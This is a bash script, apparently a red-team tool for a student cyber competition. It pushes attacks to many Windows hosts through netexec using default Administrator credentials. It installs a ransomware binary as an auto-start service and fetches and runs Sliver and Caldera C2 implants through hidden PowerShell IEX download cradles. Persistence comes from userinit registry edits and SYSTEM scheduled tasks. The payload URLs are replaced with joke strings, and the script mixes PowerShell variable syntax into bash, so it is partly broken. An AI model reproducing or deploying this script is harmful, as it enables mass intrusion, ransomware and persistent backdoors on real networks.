#!/bin/bash

# Download hosts file
curl https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt -o windowsHosts.txt


$ransom = "I was forced to learn good coding practices because of bad opsec"
$ransomFolder = "why are you looking at my scripts"
$ransomPath = "this is my malware, there are many like it, but this one is mine"
$serviceName = "meow"
$serviceDescription = "boy i hope the gumper doesnt appear"
$sliver = "quandaledingle"
$sliverFolder = "they did surgery on a grape"
$sliverBackupFolder = "rizz?"
$sliverPath = "meowwww :3"
$sliverBackupPath = "i dont get paid enough for this"
$sliverTaskDescription = "my club president is a redhead, he has no soul" 
$regPersist = "am i an apt yet"
$caldera = "nisyhama daddy daddy!!!"
$calderaPath = "ohio livvy dunn gyatt"
$calderaBackup = "the water is making the frogs gay"
$calderaBackupPath = "can we just be nice and not look at other teams scripts guys"
$calderaTaskDescription = "please"

# Drop ransom 

netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  mkdir $ransomFolder; 
  Invoke-WebRequest -Uri "$ransom" -OutFile "$ransomPath"; 
  New-Service -Name "$serviceName" -BinaryPathName "$ransomPath" -DisplayName "$serviceName" -Description "$serviceDescription" -StartupType Automatic; 
  Start-Service -Name "$serviceName"
'

# Drop sliver
netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  powershell -nop -w hidden -ep bypass IEX ((New-Object System.Net.WebClient).DownloadString("$sliver")); 
  mkdir "$sliverFolder"; 
  Invoke-WebRequest -Uri "$sliver" -OutFile "$sliverPath"; 
  reg add "$regPersist" /v userinit /d "C:\Windows\system32\userinit.exe,$sliverPath" /t reg_sz /f; 
  mkdir "$sliverBackupFolder"; 
  Invoke-WebRequest -Uri "$sliver" -OutFile "$sliverBackupPath"; 
  schtasks /create /sc minute /mo 15 /tn "$sliverTaskDescription" /tr $sliverBackupPath /ru "SYSTEM"
'

# Drop caldera
netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  powershell -nop -w hidden -ep bypass IEX ((New-Object System.Net.WebClient).DownloadString("$caldera")); 
  Invoke-WebRequest -Uri "$caldera" -OutFile "$calderaPath"; 
  reg add "$regPersist" /v userinit /d "C:\Windows\system32\userinit.exe,$calderaPath" /t reg_sz /f; 
  mkdir "$calderaBackup"; 
  Invoke-WebRequest -Uri "$caldera" -OutFile "$calderaBackupPath"; 
  schtasks /create /sc minute /mo 15 /tn "$calderaTaskDescription" /tr $calderaBackupPath /ru "SYSTEM"
'
